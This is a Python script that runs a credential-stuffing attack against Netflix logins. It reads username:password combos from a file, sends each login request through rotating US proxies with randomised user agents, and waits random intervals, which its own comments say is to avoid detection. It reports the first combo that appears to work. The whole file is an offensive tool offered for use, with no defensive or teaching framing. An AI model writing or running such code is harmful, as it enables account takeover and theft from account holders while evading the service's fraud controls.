import requests
import random
import time
import proxyscrape
from fake_useragent import UserAgent

# Function to load combos from file
def load_combos(file_path):
    combos = []
    with open(file_path, 'r') as file:
        for line in file:
            user, pwd = line.strip().split(':')
            combos.append((user, pwd))
    return combos

# Function to get a random proxy
def get_proxy():
    collector = proxyscrape.create_collector('default', 'http')
    proxy = collector.get_proxy({'country': 'us'})  # Adjust country as needed
    return proxy.get_dict()['proxy']

# Function to get a random user agent
def get_user_agent():
    ua = UserAgent()
    return ua.random

# Function to perform login attempts
def crack_netflix(combos, max_attempts):
    for i, (user, pwd) in enumerate(combos, start=1):
        print(f"Attempt {i}/{len(combos)}")
        session = requests.Session()
        proxy = get_proxy()
        user_agent = get_user_agent()
        session.proxies = {'http': f'http://{proxy}', 'https': f'https://{proxy}'}
        session.headers.update({'User-Agent': user_agent})
        
        login_url = 'https://www.netflix.com/login'
        payload = {'user': user, 'password': pwd}
        
        response = session.post(login_url, data=payload)
        if response.status_code == 200:
            print(f"Successful login! Combo: {user}:{pwd}")
            # Add logic to handle successful login (e.g., save to file, send notification)
            break  # Stop after finding the first valid combo
        else:
            print("Login failed.")

        # Sleep for a random time to mimic human behavior and avoid detection
        time.sleep(random.uniform(1, 5))

        if i >= max_attempts:
            print("Maximum attempts reached. Exiting...")
            break

# Main function
def main():
    combo_file = 'combo.txt'
    max_attempts = 10
    combos = load_combos(combo_file)
    crack_netflix(combos, max_attempts)

if __name__ == "__main__":
    main()
